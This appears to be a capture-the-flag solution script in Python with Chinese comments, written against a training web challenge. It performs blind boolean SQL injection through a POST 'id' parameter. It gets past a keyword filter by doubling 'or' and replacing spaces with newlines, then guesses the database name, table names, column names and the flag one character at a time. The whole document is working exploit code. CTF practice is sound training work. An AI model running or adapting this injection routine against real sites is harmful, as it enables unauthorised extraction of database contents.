import requests
print("start -- 数据库长度")
str = "You are in"
url = "http://ctf5.shiyanbar.com/web/earnest/index.php "
for i in range(1,30):
    key = {'id':"0'oorr(length(database())=%s)oorr'0"%i}
    res = requests.post(url,data=key).text
    print(i)
    if str in res:
        N = i
        print('database length: %s'%i)
        break
print("end!结束爆破数据库长度")

guess = "abcdefghijklmnopqrstuvwxyz 0123456789~+=-*/\{}?!:@#$&[]._"
database = ''
print("库名字")
for i in range (1, N+1):    #将daabase长度迁移到这里
    for j in guess:
        key = {'id':"0'oorr((mid((database())from(%s)foorr(1)))='%s')oorr'0" %(i,j)}
        res = requests.post(url,data=key).text
        print('............%s......%s.......'%(i,j))
        if str in res:
            database += j
            break
print(database)
print("end!结束爆破数据库名字")


i = 1
N = 2
print("开始拆解表长度")
while True:
    res = "0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='')oorr'0" % i  
    #将daabase的用于拆表长
    res = res.replace(' ',chr(0x0a))
    key = {'id':res}
    r = requests.post(url,data=key).text
    print(i)
    if str in r:
        print("length: %s"%i)
        break
    i+=1
    N+=1
print("end!结束表长度爆破")
table = ""
print("start 开始拆解表名")

for i in range(1,N):  #将得到的表长用于遍历表的每一位
    for j in guess:
        res = "0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='%s')oorr'0"%(i,j)
        res = res.replace(' ', chr(0x0a))
        key = {'id':res}
        r = requests.post(url,data=key).text
        print(i)
        if str in r:
            table += j
            break
print(table)
print("end!")



i = 1
N = 1
print("start 拆解列宽") #针对数据库的表的列进行列宽拆解
while True:
    res = "0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='')oorr'0"%i
    res = res.replace(' ',chr(0x0a))
    key = {'id':res}
    r = requests.post(url,data=key).text
    print(i)
    if str in r:
        print("length: %s"%i)
        break
    i += 1
    N += 1
print("end! 列宽破解完成")

column = ""   #用于计算列数据

for i in range(1,N):
    for j in guess:  #将table_name放入其中 ，长度为列数据
        res = "0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='%s')oorr'0"%(i,j)
        res = res.replace(' ',chr(0x0a))
        key = {'id':res}
        r = requests.post(url,data=key).text
        print("......%s.........%s........."%(i,j))
        if str in r:
            column+=j
            break
print(column)#得到的详细列名

flag = ""  #数据库的表中的列的数据

for i in range(1,20):
    for j in guess:
        res = "0'oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))='%s')oorr'0"%(i,j)
        res = res.replace(' ',chr(0x0a))
        key = {'id':res}
        r = requests.post(url,data=key).text
        'print("........%s..........%s........"%(i,j))'
        if str in r:
            flag+=j
            print(flag)
            break
print(flag)
print("end!以上为flag")


